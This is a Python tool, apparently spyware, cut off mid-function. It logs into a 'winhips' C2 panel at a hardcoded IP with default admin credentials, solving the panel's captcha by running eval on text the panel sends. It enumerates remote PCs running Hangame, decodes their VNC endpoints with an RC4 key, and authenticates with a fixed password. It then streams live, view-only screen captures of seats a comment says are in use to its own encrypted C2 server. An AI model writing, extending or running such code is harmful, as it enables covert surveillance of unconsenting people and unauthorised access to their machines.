#!/usr/bin/env python3
# c2push_v4.py — OnPxe 직결 좌석 → C2: RFB raw 프레임을 ffmpeg H264(fMP4)로 실시간 인코딩해
#                WebSocket으로 스트리밍하고, DocViewer 프론트가 MediaSource(MSE)로 재생.  [v4 바이너리]
#
# v4 변경사항 (스트림 와이어 효율화):
#  1. 스트림 프레임을 0xB1 바이너리 프로토콜로 전환 — base64(+33%) + 이중JSON 이스케이프 +
#     JSON AEAD 봉투(+33%) + per-frame sha256 제거 (세그먼트당 ~1.86x 팽창 → ~1.0x).
#     와이어: 0xB1 || nonce(12) || AES-256-GCM(sessionKey).Seal(frame)
#     frame: kind(1) || stream(8,LE) || seq(8,LE) || codecLen(1) || codec || payload
#     kind: 1=init(payload=ftyp+moov, codec 포함), 2=media(payload=moof+mdat, codec 없음).
#     무결성은 GCM 태그가 담당(sha256 제거 사유). 서버 main.go binStreamMagic과 명세 공유.
#  2. H264_FPS 8 → 30 (라이브 운영값 흡수) — gop=max(2,fps//2)=15로 초당 ~2 세그먼트.
#  3. LED init 게이트 (라이브 운영 로직 흡수): 새 스트림 세대의 init 세그먼트가 실제 송출
#     성공하기 전까지 LATEST["ok"]=False 유지 → 대시보드 LED가 "스트림 살아있지만 init
#     미도착" 상태를 green으로 오표시하지 않음. 송출 예외 시 False.
#
# v3 변경사항 (송출 끊김/버벅거림 개선):
#  1. 파이프라인 3분리: RFB 수신 스레드 / 인코더 공급 스레드(monotonic 고정 fps) / 송출 스레드.
#     v2는 단일 루프가 증분요청 무응답 대기(IDLE_TIMEOUT 3s)에 묶여 ffmpeg 공급이 굶고,
#     그 사이 프래그먼트 전달이 끊겨 MSE 버퍼 언더런(화면 끊김)이 발생했음.
#  2. RFB EnableContinuousUpdates(150) 지원 시 서버 푸시 모드로 전환(요청/응답 RTT 제거).
#     미지원 좌석은 자동으로 폴링 모드 폴백 + 좌석별 기억(SEAT_POLL_ONLY).
#  3. RFB/송출 두 WebSocket 모두 TCP_NODELAY — Nagle 지연(소형 요청당 ~40-200ms) 제거.
#  4. 인코더 출력 큐 상한 + 송출 지연 시 오래된 media 세그먼트 폐기(init 보존) —
#     뷰어가 느릴 때 v2는 out 리스트 무한 증가로 지연 누적/OOM 위험이 있었음.
#  5. ffmpeg 공급을 monotonic 8fps 고정(화면 정적이어도 유지 — x264 skip 프레임은 거의 0바이트라
#     대역폭 손해 없이 재생 타임라인 연속성 확보), RFB 끊김 중엔 1fps 저감.
#  6. ZLIB(6) 인코딩 광고 + 디코드(연속 zlib 스트림) — 서버가 지원하면 인바운드 대역폭 대폭 절감.
#     미지원/디코드 실패 좌석은 Raw로 자동 폴백(SEAT_NO_ZLIB).
import atexit, signal
import websocket, ssl, struct, time, json, threading, os, sys, base64, hashlib, subprocess, shutil, zlib
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from Crypto.Cipher import AES, DES

WS_URL="wss://127.0.0.1:8443/socket/v1"
AUTH_TOKEN=open('/root/c2/auth_token.txt').read().strip()
PSK=open('/root/c2/psk.txt').read().strip()
HKDF_INFO=b"c2lab-v2|ecdh-session"
PW="OnPxe"
SCALE=(960,540)
SEATS_FILE="/root/c2/seats.json"

FFMPEG = shutil.which("ffmpeg") or "ffmpeg"
H264_FPS = 15           # 타깃 프레임레이트 — 1 vCPU 대응: 좌석당 인코더 CPU 절감 (24 → 15)
FULL_TIMEOUT = 60.0     # full/본문 수신 타임아웃(초)
POLL_IDLE = 0.7         # 폴링 모드 증분 요청 무응답 판정(초) — v2 3.0에서 단축
CONT_TIMEOUT = 2.0      # continuous 모드 서버 푸시 대기(초) — 정적 화면이면 이 간격으로 idle
PUSHQ_MAX = 24          # 송출 대기 큐 상한(gop=4 → 0.5s/seg 기준 약 24초분, 실제로는 수초 내 소비)

def ck(): return hashlib.sha256(("c2-lab-v1|"+PSK).encode()).digest()
def seal(k,p):
    n=os.urandom(12); c=AES.new(k,AES.MODE_GCM,nonce=n); ct,t=c.encrypt_and_digest(p)
    return json.dumps({"v":1,"alg":"aes-256-gcm","n":base64.b64encode(n).decode(),"ct":base64.b64encode(ct+t).decode()})
def openenv(k,b):
    e=json.loads(b); n=base64.b64decode(e["n"]); ct=base64.b64decode(e["ct"])
    return AES.new(k,AES.MODE_GCM,nonce=n).decrypt_and_verify(ct[:-16],ct[-16:])
def seal_raw(k,p):
    """JSON/base64 봉투 없는 AEAD: nonce(12) || ct || tag(16). 서버 aeadOpenRaw와 대응."""
    n=os.urandom(12); c=AES.new(k,AES.MODE_GCM,nonce=n); ct,t=c.encrypt_and_digest(p)
    return n+ct+t
# v4 바이너리 스트림 와이어 상수 — 서버 main.go binStreamMagic/applyStreamFrameBinary와 명세 공유.
# 프레임: kind(1) || stream(8,LE) || seq(8,LE) || codecLen(1) || codec || payload
BIN_STREAM_MAGIC = 0xB1
BIN_KIND_INIT, BIN_KIND_MEDIA = 1, 2
def bin_stream_frame(kind, gen, seq, codec, payload):
    cb = codec.encode() if codec else b""
    return struct.pack("<BQQ", kind, gen, seq) + bytes([len(cb)]) + cb + payload
def bit_reverse(b): return int('{:08b}'.format(b)[::-1],2)
def vnc_auth(c,p):
    k=bytes(bit_reverse(b) for b in p.encode()[:8].ljust(8,b'\x00'))
    return DES.new(k,DES.MODE_ECB).encrypt(c[:8])+DES.new(k,DES.MODE_ECB).encrypt(c[8:16])

import urllib.request, urllib.parse, socket as _socket
CBASE = "http://198.13.42.105:80"

def _nodelay(ws):
    """websocket-client 소켓에 TCP_NODELAY (Nagle 해제). SSL/ plain 모두 setsockopt 동일."""
    try:
        s_ = getattr(ws, "sock", None)
        if s_: s_.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
    except Exception:
        pass

def _rc4(data, key):
    if isinstance(data, str): data = data.encode()
    S = list(range(256)); j = 0
    kb = key.encode() if isinstance(key, str) else key
    for i in range(256):
        j = (j + S[i] + kb[i % len(kb)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = j = 0; out = bytearray()
    for ch in data:
        i = (i + 1) & 0xFF; j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(ch ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)

def _pxiq(obj):
    p = _rc4(json.dumps(obj, separators=(",", ":")), "RemoteHole_")
    return b"PSiq" + struct.pack("<I", len(p)) + p

def _parse_psiq(buf):
    out = []
    while len(buf) >= 8 and buf[:4] == b"PSiq":
        ln = struct.unpack("<I", buf[4:8])[0]
        if len(buf) < 8 + ln: break
        raw = buf[8:8+ln]
        try: out.append(json.loads(_rc4(raw, "RemoteHole_").decode("utf-8","replace")))
        except: out.append({})
        buf = buf[8+ln:]
    return out, buf

def _http_get(url, token=None):
    req = urllib.request.Request(url)
    req.add_header("User-Agent", "Mozilla/5.0")
    if token: req.add_header("Authorization", "Bearer " + token)
    with urllib.request.urlopen(req, timeout=20) as r:
        return json.loads(r.read().decode("utf-8","replace"))

def _http_post(url, body, token=None):
    req = urllib.request.Request(url, data=json.dumps(body).encode(), method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "Mozilla/5.0")
    if token: req.add_header("Authorization", "Bearer " + token)
    with urllib.request.urlopen(req, timeout=20) as r:
        return json.loads(r.read().decode("utf-8","replace"))

def _decode_remote_url(url):
    q = url.split("query=", 1)[1]
    t = urllib.parse.unquote(q); t = base64.b64decode(t); t = _rc4(t, "www.onpxe.net")
    return json.loads(t.decode("utf-8","replace"))

def _mclient_vnc(cfg, timeout=10):
    host = cfg["mhost"]; port = int(cfg["mport"])
    ws = websocket.create_connection(f"ws://{host}:{port}", timeout=10)
    cmd4 = {"cmd":4,"UId":0,"BId":0,"ReConnectNum":0,"Token":cfg["token"],"Session":cfg["session"]}
    ws.send_binary(_pxiq(cmd4))
    buf = b""; ws.settimeout(timeout); end = time.time()+timeout; result = None
    while time.time() < end:
        try: chunk = ws.recv()
        except: break
        buf += chunk
        frames, buf = _parse_psiq(buf)
        for f in frames:
            if isinstance(f, dict) and f.get("cmd") == 5:
                result = f; break
        if result: break
    ws.close(); return result

SEATS = {}; SEATS_LOCK = threading.Lock()
REFRESH_EVENT = threading.Event()  # 연결 끊김 시에만 재열거 요청
SEAT_POLL_ONLY = set()             # continuous 미지원으로 확인된 좌석 → 폴링 모드 고정
SEAT_NO_ZLIB = set()               # ZLIB 디코드 실패 좌석 → Raw만 광고
SEAT_THREADS = set()                # 실행 중 좌석 스레드 — 중복 스폰 방지 (prune→재입장 레이스 방어)
SEAT_THREADS_LOCK = threading.Lock()
MAX_ACTIVE_ENCODERS = 3             # 동시 인코더 상한 — 1 vCPU 대응, 초과 시 LRU 회수
STT_BY_NAME = {}                    # name -> 좌석 공유 상태(stt) 인덱스 — 인코더 상한 회수용
STT_BY_NAME_LOCK = threading.Lock()
_PROCS = set()                      # 살아있는 ffmpeg 자식 — 종료 시 일괄 정리
_PROCS_LOCK = threading.Lock()

def _kill_all_encoders():
    with _PROCS_LOCK:
        procs = list(_PROCS)
    for p in procs:
        try:
            if p.poll() is None:
                p.kill()
        except Exception:
            pass

def _on_signal_killenc(signum, frame):
    _kill_all_encoders()
    sys.exit(0)

atexit.register(_kill_all_encoders)
try:
    signal.signal(signal.SIGTERM, _on_signal_killenc)
    signal.signal(signal.SIGINT, _on_signal_killenc)
except Exception:
    pass

def _evict_oldest_encoders(agent_id):
    """동시 인코더 상한 초과 시 — 마지막 킵얼라이브(=stream_deadline)가 가장 옛날 좌석부터 회수."""
    with STT_BY_NAME_LOCK:
        live = [(nm, stt.stream_deadline) for nm, stt in STT_BY_NAME.items()
                if nm != agent_id and stt.want_stream.is_set()]
    live.sort(key=lambda kv: kv[1])
    over = len(live) + 1 - MAX_ACTIVE_ENCODERS
    for nm, _ in live[:max(0, over)]:
        stt = STT_BY_NAME.get(nm)
        if stt is not None:
            stt.want_stream.clear()
            print(f"[{nm}] 인코더 상한({MAX_ACTIVE_ENCODERS}) 초과 — LRU 회수", flush=True)
SEAT_DIRS = {}   # 좌석 주소 자산 캐시: name -> {"status": "ok"/"fail", "ts": 시각} — ok 상태는 재해석하지 않음(주소 회전 방지)

def refresh_seats():
    """winhips C2에서 현재 직결 좌석 주소를 재열거 → SEATS 갱신. 변경 감지 시 로그."""
    try:
        cap = _http_get(CBASE + "/api/captcha")
        key = cap["data"]["key"]; q = cap["data"]["q"]
        ans = int(eval(q.split("=")[0].strip()))
        resp = _http_post(CBASE + "/api/login", {"username":"admin","password":"123123","captchaKey":key,"captchaAns":str(ans)})
        token = resp.get("data", {}).get("token")
        if not token: return 0
        clients = _http_get(CBASE + "/api/clients", token)
        data = clients.get("data")
        if isinstance(data, dict):
            for k in ("data","list","clients","items"):
                if k in data and isinstance(data[k], list): data = data[k]; break
        # winhips 로스터 덤프 — 뷰어 장비목록 소스 (/tools 정적 라우트로 서빙)
        try:
            os.makedirs("/root/c2/tools", exist_ok=True)
            roster = []
            for c in (data if isinstance(data, list) else []):
                pc = c.get("pcname") or ""
                ip = c.get("ip") or ""
                lan = c.get("lanip") or ""
                roster.append({
                    "pcname": pc, "ip": ip, "lanip": lan,
                    "mac": c.get("mac") or "", "state": c.get("state"),
                    "gamenames": str(c.get("gamenames") or ""), "uptime": c.get("uptime"),
                    "direct": bool(ip and ip == lan),
                    "agent_id": ("onpxe-" + pc) if pc else "",
                    "streamable": bool(ip and ip == lan and pc),
                })
            tmp = "/root/c2/tools/winhips_clients.json.tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump({"clients": roster, "updated_at": int(time.time())}, f, ensure_ascii=False)
            os.replace(tmp, "/root/c2/tools/winhips_clients.json")
        except Exception as e:
            print(f"[refresh] roster dump ERR {type(e).__name__}: {str(e)[:60]}", flush=True)
        direct = [c for c in data if (("hangame" in (c.get("gamelist") or "").lower()) or ("한게임" in str(c.get("gamenames") or ""))) and c.get("ip") == c.get("lanip")]
        # 주소 스티키: ok 상태 좌석은 재해석하지 않음 — winhips 터널 회전 폭탄 방지 (실패/신규 좌석만 재해석)
        with SEATS_LOCK:
            _have = set(SEATS)
        _need_refresh = [c for c in direct if c.get("pcname") not in _have or SEAT_DIRS.get(c.get("pcname"), {}).get("status") != "ok"]
        direct = _need_refresh + [c for c in direct if c.get("pcname") in SEATS and SEAT_DIRS.get(c.get("pcname"), {}).get("status") == "ok"]
        # NOTE: _one 실행은 _need_refresh만 — ok 좌석은 fresh에 이미 SEATS 값을 그대로 쓴다(아래 fresh 초기화 수정 참고).
        fresh = {}; fresh_lock = threading.Lock()
        with SEATS_LOCK:
            for _nm in [c.get("pcname") for c in direct]:
                if SEAT_DIRS.get(_nm, {}).get("status") == "ok" and _nm in SEATS:
                    fresh[_nm] = dict(SEATS[_nm])
        def _one(c):
            pcname = c.get("pcname"); keyc = c.get("key")
            try:
                u = _http_get(CBASE + "/api/remote-url?key=" + urllib.parse.quote(keyc, safe=""), token)
                cfg = _decode_remote_url(u["data"]["url"])
                vnc = _mclient_vnc(cfg)
            except Exception as ext:
                print(f"[refresh] {pcname} 좌석 주소 해석 실패: {type(ext).__name__} {str(ext)[:60]}", flush=True)
                return
            if not vnc:
                print(f"[refresh] {pcname} VNC 종단 미제공 (주소 해석은 성공)", flush=True)
                return
            la = vnc.get("LanAddr"); vp = vnc.get("VncPost")
            if la is not None and vp:
                with fresh_lock:
                    fresh[pcname] = {"host": _socket.inet_ntoa(struct.pack("<I", la)), "port": vp}
        ths = [threading.Thread(target=_one, args=(c,)) for c in _need_refresh]
        for t in ths: t.start()
        for t in ths: t.join()
        eligible = {c.get("pcname") for c in direct}
        with SEATS_LOCK:
            carried = {nm: SEATS[nm] for nm in eligible if nm not in fresh and nm in SEATS}
            fresh_all = dict(fresh); fresh_all.update(carried)
            if carried:
                print(f"[refresh] 해석 실패 보류 좌석 이전값 재사용 {len(carried)}대: {sorted(carried)[:12]}", flush=True)
            changed = (set(SEATS) != set(fresh_all)) or any(SEATS.get(n) != fresh_all[n] for n in fresh_all)
            SEATS.clear(); SEATS.update(fresh_all)
        # 부팅 캐시만 유지 — 평시 소스는 winhips live 재구성 (seats.json은 스냅샷이 아닌 캐시)
        try:
            with open(SEATS_FILE, "w", encoding="utf-8") as f:
                json.dump([{"name": nm, "host": fresh_all[nm]["host"], "port": fresh_all[nm]["port"]} for nm in sorted(fresh_all)], f)
        except Exception: pass
        if changed:
            print(f"[refresh] 좌석 {len(fresh)}대 주소 갱신 (변경 감지됨)", flush=True)
        return len(fresh)
    except Exception as e:
        print(f"[refresh] ERR {type(e).__name__}: {str(e)[:70]}", flush=True)
        return 0

def refresh_loop():
    refresh_seats()
    while True:
        REFRESH_EVENT.wait(timeout=10)   # 10s: 뷰어 장비목록 준실시간 동기화
        REFRESH_EVENT.clear()
        refresh_seats()

# ============================ RFB (robust) ============================
class RFB:
    """websocket 위 RFB 스트림. read(n)는 정확히 n바이트(타임아웃 시 None).
       wait_update()는 비-FramebufferUpdate 메시지 본문까지 소비해 desync를 방지."""
    def __init__(s, w):
        s.w = w; s.b = b''; s.W = 0; s.H = 0; s.resized = False
        s.z = zlib.decompressobj()   # ZLIB 인코딩 연속 스트림 (spec: rect/업데이트 간 유지)
        s.enc_fail = False           # 인코딩 디코드 실패 → 좌석을 Raw 폴백시키는 플래그
    def _f(s, n, t=30):
        s.w.settimeout(t); e = time.time() + t
        while len(s.b) < n and time.time() < e:
            try:
                c = s.w.recv()
                if c is None or c == b'': break
                if isinstance(c, str): c = c.encode()
                s.b += c
            except: break
        return len(s.b) >= n
    def read(s, n, t=30):
        if not s._f(n, t): return None
        o = s.b[:n]; s.b = s.b[n:]; return o
    def send(s, d):
        if isinstance(d, str): d = d.encode()
        s.w.send(d, opcode=2)

    def _skip(s, n, t=FULL_TIMEOUT):
        return s.read(n, t) is not None

    def request_update(s, W, H, incremental):
        s.send(struct.pack(">BBHHHH", 3, 1 if incremental else 0, 0, 0, W, H))

    def enable_continuous(s, W, H, on=True):
        """EnableContinuousUpdates(client msg 150). 지원 서버는 변화 시 자체 푸시."""
        s.send(struct.pack(">BBHHHH", 150, 1 if on else 0, 0, 0, W, H))

    def wait_update(s, fb, W, H, first_timeout, body_timeout=FULL_TIMEOUT):
        """FramebufferUpdate 도착까지 서버 메시지를 소비 (요청 전송은 호출자 책임).
           반환: 'ok'(업데이트 반영) | 'resize' | 'idle'(무응답, 프레임 유지) | None(연결 사망→재연결)."""
        while True:
            mt = s.read(1, first_timeout)
            if mt is None:
                return "idle"
            t = mt[0]
            if t == 0:                 # FramebufferUpdate
                if not s._read_update(fb, W, H, body_timeout):
                    return None
                return "resize" if s.resized else "ok"
            elif t == 1:               # SetColourMapEntries: 1pad + 2first + 2count + count*6
                if not s._skip(1): return None
                h = s.read(2, body_timeout)
                if h is None: return None
                cnt = struct.unpack(">H", h)[0]
                if not s._skip(2, body_timeout): return None   # first-colour
                if not s._skip(cnt * 6, body_timeout): return None
            elif t == 3:               # ServerCutText: 3pad + 4len + text
                if not s._skip(3): return None
                h = s.read(4, body_timeout)
                if h is None: return None
                ln = struct.unpack(">I", h)[0]
                if not s._skip(ln, body_timeout): return None
            elif t in (2, 150):        # Bell(1B) / EndOfContinuousUpdates(1B) — 본문 없음
                pass
            elif t == 252:             # winhips 확장(관측): 1pad + 2sub; sub==771 → 1+4+4+len
                if not s._skip(1): return None
                h = s.read(2, body_timeout)
                if h is None: return None
                sub = struct.unpack(">H", h)[0]
                if sub == 771:
                    if not s._skip(1): return None
                    h = s.read(4, body_timeout)
                    if h is None: return None
                    clen = struct.unpack(">I", h)[0]
                    if not s._skip(4): return None
                    if not s._skip(clen, body_timeout): return None
                # 그 외 sub는 무시 (다음 메시지 헤더로 진행)
            else:
                return None            # 미지 메시지 → 동기화 불가 → 재연결

    def next_update(s, fb, W, H, incremental, idle_timeout=POLL_IDLE, body_timeout=FULL_TIMEOUT):
        """폴링 모드: FrameBufferUpdateRequest 전송 후 wait_update."""
        s.request_update(W, H, incremental)
        return s.wait_update(fb, W, H, idle_timeout if incremental else FULL_TIMEOUT, body_timeout)

    def _blit(s, fb, W, x, y, rw, rh, d):
        for yy in range(rh):
            ss = yy * rw * 4; dd = ((y + yy) * W + x) * 4
            fb[dd:dd + rw * 4] = d[ss:ss + rw * 4]

    def _read_update(s, fb, W, H, t):
        if s.read(1, t) is None: return False          # padding
        h = s.read(2, t)
        if h is None: return False
        nr = struct.unpack(">H", h)[0]
        s.resized = False
        newW, newH = W, H
        for _ in range(nr):
            hh = s.read(12, t)
            if hh is None: return False
            x, y, rw, rh, enc = struct.unpack(">HHHHi", hh)
            if enc == 0:                                # Raw
                d = s.read(rw * rh * 4, t)
                if d is None: return False
                s._blit(fb, W, x, y, rw, rh, d)
            elif enc == 6:                              # ZLIB (연속 zlib 스트림, rect당 4B 길이)
                h4 = s.read(4, t)
                if h4 is None: return False
                clen = struct.unpack(">I", h4)[0]
                blob = s.read(clen, t)
                if blob is None: return False
                try:
                    d = s.z.decompress(blob)
                except Exception:
                    s.enc_fail = True                  # 스트림 desync → 좌석 Raw 폴백
                    return False
                need = rw * rh * 4
                if len(d) != need:                     # 정확히 한 rect 분량이어야 함(아니면 desync)
                    s.enc_fail = True
                    return False
                s._blit(fb, W, x, y, rw, rh, d)
            elif enc == 1:                              # CopyRect (src x,y 4B)
                src = s.read(4, t)
                if src is None: return False
                sx, sy = struct.unpack(">HH", src)
                for yy in range(rh):
                    soff = ((sy + yy) * W + sx) * 4
                    doff = ((y + yy) * W + x) * 4
                    fb[doff:doff + rw * 4] = fb[soff:soff + rw * 4]
            elif enc == -239:                           # RichCursor pseudo
                sz = rw * rh * 4 + ((rw + 7) // 8) * rh
                if not s._skip(sz, t): return False
            elif enc == -240:                           # XCursor pseudo
                sz = rw * rh * 4 + ((rw + 7) // 8) * rh + 6
                if not s._skip(sz, t): return False
            elif enc == -224:                           # LastRect → 종료 (본문 없음)
                break
            elif enc == -223:                           # DesktopSize: 본문 없음 — 헤더 rw/rh가 새 크기
                if rw > 0 and rh > 0 and (rw, rh) != (W, H):
                    newW, newH = rw, rh
            else:
                return False                            # 미지 인코딩 → 길이 불명 → 재연결
        if (newW, newH) != (W, H):
            s.W, s.H = newW, newH
            s.resized = True
        return True


def rfb_connect(host, port, use_zlib=True):
    try:
        ws = websocket.create_connection(f"ws://{host}:{port}", timeout=10)
    except Exception as e:
        print(f"[rfb] connect EXC {host}:{port} {type(e).__name__}: {str(e)[:50]}", flush=True)
        return None
    _nodelay(ws)                                        # v3: Nagle 해제 — 소형 요청 지연 제거
    r = RFB(ws)
    try:
        ver = r.read(12)
        if not ver or ver[:4] != b"RFB ": return None
        r.send("RFB 003.008\n")
        n = r.read(1)
        if n is None: return None
        n = n[0]; r.read(n); r.send(b'\x02')
        chal = r.read(16)
        if chal is None: return None
        r.send(vnc_auth(chal, PW))
        res = r.read(4)
        if res is None or struct.unpack(">I", res)[0] != 0:
            return None
        r.send(b'\x01')
        si = r.read(24)
        if si is None: return None
        W, H = struct.unpack(">HH", si[:4]); pf = si[4:20]
        nl = struct.unpack(">I", si[20:24])[0]
        r.read(nl)
        r.W, r.H = W, H
        # SetPixelFormat(서버 포맷 그대로) + SetEncodings(ZLIB 우선, 미지원이면 Raw로 내려옴)
        r.send(b'\x00\x00\x00\x00' + pf)
        encs = ([6, 0] if use_zlib else [0]) + [1, -239, -240, -224, -223]
        r.send(struct.pack(">BxH", 2, len(encs)) + b"".join(struct.pack(">i", e) for e in encs))
        return r, W, H
    except Exception:
        try: ws.close()
        except Exception: pass
        return None


def wake(r):
    return  # view-only: 검정은 아티팩트(fact#487), 좌석 사용중이라 키 주입 제거 (하위 호환용 stub)
    r.send(struct.pack(">BBxxI",4,1,0xFFEB)); r.send(struct.pack(">BBxxI",4,0,0xFFEB)); time.sleep(0.5)
    r.send(struct.pack(">BBxxI",4,1,0xFF1B)); r.send(struct.pack(">BBxxI",4,0,0xFF1B)); time.sleep(0.8)


# ============================ H264 fMP4 인코더 ============================
def avc_codec_string(init_bytes):
    """init 세그먼트(ftyp+moov)의 avcC 박스에서 codec 문자열(avc1.PPCCLL) 추출."""
    i = init_bytes.find(b"avcC")
    if i < 0 or i + 8 >= len(init_bytes):
        return "avc1.42E01E"
    prof = init_bytes[i + 5]; compat = init_bytes[i + 6]; lvl = init_bytes[i + 7]
    return "avc1.%02X%02X%02X" % (prof, compat, lvl)


class H264Streamer:
    """raw bgr0 프레임을 stdin으로 받아 ffmpeg(libx264, fragmented MP4)로 인코딩.
       stdout의 fMP4를 박스 단위로 파싱해 (init / media) 세그먼트를 큐에 적재.
       drain()은 (kind, bytes, codec) 리스트를 반환.
       v3: out 큐 상한 — 뷰어 지연 시 가장 오래된 media 세그먼트 폐기(init 보존)."""
    OUT_MAX = 24
    def __init__(self, w, h, fps=H264_FPS, target_w=SCALE[0]):
        self.w, self.h, self.fps = w, h, fps
        self.out = []
        self.lock = threading.Lock()
        self._buf = b""
        self._init = b""
        self._init_done = False
        self._cur = None
        self._stop = False
        tw = min(target_w, w)
        gop = H264_FPS               # 1 GOP = 1초(fps 연동) — 매 프레임 키프레임 낭비 제거, 전환 지연 최대 1초
        cmd = [FFMPEG, "-hide_banner", "-loglevel", "error",
               "-f", "rawvideo", "-pixel_format", "bgr0",
               "-video_size", f"{w}x{h}", "-framerate", str(fps), "-i", "pipe:0",
               "-an", "-c:v", "libx264", "-preset", "ultrafast", "-tune", "zerolatency",
               "-pix_fmt", "yuv420p",
               "-g", str(gop), "-keyint_min", str(gop), "-sc_threshold", "0",
               "-refs", "1", "-bf", "0", "-threads", "1",
               "-vf", f"scale={tw}:-2",
               "-f", "mp4", "-movflags", "frag_keyframe+empty_moov+default_base_moof",
               "pipe:1"]
        self.proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.DEVNULL, bufsize=0)
        with _PROCS_LOCK:
            _PROCS.add(self.proc)
        self._reader = threading.Thread(target=self._read_loop, daemon=True)
        self._reader.start()

    def feed(self, raw_bytes):
        try:
            self.proc.stdin.write(raw_bytes)
            self.proc.stdin.flush()
        except Exception:
            self._stop = True

    def drain(self):
        with self.lock:
            items = self.out; self.out = []
        return items

    def stop(self):
        self._stop = True
        try: self.proc.stdin.close()
        except Exception: pass
        try: self.proc.terminate()
        except Exception: pass
        try:
            self.proc.wait(timeout=3)   # reap — 미회수면 defunct 잔존
        except Exception:
            try: self.proc.kill()       # TERM 무시 시 강제 — 자식 잔존은 CPU 누수
            except Exception: pass
            try: self.proc.wait(timeout=2)
            except Exception: pass
        with _PROCS_LOCK:
            _PROCS.discard(self.proc)

    def _read_loop(self):
        try:
            while not self._stop:
                chunk = self.proc.stdout.read(65536)
                if not chunk:
                    break
                self._buf += chunk
                self._parse()
        except Exception:
            pass
        try:
            self._parse(final=True)
        except Exception:
            pass

    def _parse(self, final=False):
        while True:
            if len(self._buf) < 8:
                break
            size = struct.unpack(">I", self._buf[0:4])[0]
            typ = self._buf[4:8]
            hdr = 8
            if size == 1:
                if len(self._buf) < 16: break
                size = struct.unpack(">Q", self._buf[8:16])[0]
                hdr = 16
            if size == 0:
                break                          # EOF 박스 — live에서는 미발생
            if len(self._buf) < size:
                break
            box = self._buf[:size]
            self._buf = self._buf[size:]
            self._process(typ, box)

    def _process(self, typ, box):
        if typ in (b"ftyp", b"moov"):
            self._init += box
            if typ == b"moov":
                self._emit_init()
        elif typ == b"moof":
            if self._cur is not None:
                self._emit_seg()
            self._cur = [box]
        elif typ == b"mdat":
            if self._cur is not None:
                self._cur.append(box)
                self._emit_seg()
                self._cur = None
        # sidx / mfra 등은 무시

    def _emit_init(self):
        if self._init_done or not self._init:
            return
        self._init_done = True
        codec = avc_codec_string(self._init)
        with self.lock:
            self.out.append(("init", self._init, codec))

    def _emit_seg(self):
        if self._cur is None:
            return
        data = b"".join(self._cur)
        self._cur = None
        with self.lock:
            if len(self.out) >= self.OUT_MAX:
                for i, (k, _, _) in enumerate(self.out):
                    if k == "media":
                        del self.out[i]
                        break
                else:
                    self.out.pop(0)
            self.out.append(("media", data, ""))


# ============================ 좌석 루프 ============================
STREAM_GEN = {}          # agent_id → 스트림 세대(generation). 재연결(새 ffmpeg)마다 증가
STREAM_GEN_LOCK = threading.Lock()

def _next_stream_gen(agent_id):
    with STREAM_GEN_LOCK:
        g = STREAM_GEN.get(agent_id, 0) + 1
        STREAM_GEN[agent_id] = g
        return g

def seat_loop(name):
    agent_id = f"onpxe-{name}"
    print(f"[{name}] seat thread start", flush=True)
    with SEAT_THREADS_LOCK:
        if name in SEAT_THREADS:
            print(f"[{name}] duplicate spawn skip", flush=True)
            return
        SEAT_THREADS.add(name)
    try:
        LATEST = {"ok": False}; wlock = threading.Lock()
        box = [None]                  # box[0] = (skey, ws) 원자적 쌍
        slock = threading.Lock()      # push/heartbeat/command 간 send 직렬화

        # ---- 좌석 공유 상태 (RFB 수신 → 인코더 공급 브리지) ----
        class _St: pass
        stt = _St()
        stt.lock = threading.Lock()
        stt.fb = None                 # bytearray(W*H*4) — RFB 스레드가 발행, feed 스레드가 스냅샷
        stt.W = 0; stt.H = 0
        stt.dirty = 0                 # 반영된 업데이트 누적 (frame 번호 대용)
        stt.rfb_alive = False
        stt.reset_evt = threading.Event()   # RFB (재)연결/리사이즈 → 인코더 리빌드 신호
        stt.want_stream = threading.Event() # 온디맨드 게이트 — stream_start 수신 시에만 RFB/인코더 구동
        stt.stream_deadline = 0.0           # 킵얼라이브(stream_start) 갱신 만료 시점 — 경과 시 게이트 해제
        stt.rfb_thread = None               # rfb 수신 스레드 핸들 — stream_start 시 사망 재스폰 판정용
        with STT_BY_NAME_LOCK:
            STT_BY_NAME[name] = stt

        # ---- 송출 대기 큐 (feed → push) ----
        pushq = []
        pq_cond = threading.Condition()
        def _pushq_put(item):
            with pq_cond:
                if len(pushq) >= PUSHQ_MAX:
                    for i, it in enumerate(pushq):
                        if it[1] == "media":
                            del pushq[i]; break
                    else:
                        pushq.pop(0)
                pushq.append(item)
                pq_cond.notify()
        def _pushq_get(timeout=1.0):
            with pq_cond:
                if not pushq:
                    pq_cond.wait(timeout)
                return pushq.pop(0) if pushq else None
        def _pushq_clear():
            with pq_cond:
                pushq.clear()

        def _push_segment(gen, kind, data, codec, seq):
            e = box[0]
            if not e: return
            skey, ws = e
            # v4: 0xB1 바이너리 프레임 — base64/sha256/이중JSON 제거. 무결성은 GCM 태그가 담당.
            bkind = BIN_KIND_INIT if kind == "init" else BIN_KIND_MEDIA
            frame = bin_stream_frame(bkind, gen, seq if kind != "init" else 0,
                                     codec if kind == "init" else "", data)
            try:
                with slock:
                    ws.send(bytes([BIN_STREAM_MAGIC]) + seal_raw(skey, frame), opcode=2)
                # LED init 게이트: 새 세대의 init가 실제 송출돼야 스트림 생존으로 표시
                if bkind == BIN_KIND_INIT:
                    stt.init_payload = (data, codec, gen)   # 재등록 시 init 재송출용 — c2server ring 리셋 대비
                    with wlock: LATEST["ok"] = True
            except Exception as ex:
                if isinstance(ex, websocket.WebSocketConnectionClosedException):
                    box[0] = None
                    try: w.close()   # 반사경 죽음(root cause: recv 블록 탈출) — 소켓 폐쇄로 recv 예외 → 재등록 루프 복귀
                    except Exception: pass
                with wlock: LATEST["ok"] = False
                print(f"[{name}] push EXC {type(ex).__name__}: {str(ex)[:60]}", flush=True)

        # ---- 스레드 1: RFB 수신 (continuous 우선, 폴링 폴백) ----
        def rfb_loop():
            fail_n = 0
            while True:
                if name not in SEATS:
                    print(f"[{name}] rfb thread exit (좌석 무기록)", flush=True)
                    return
                if not stt.want_stream.is_set():
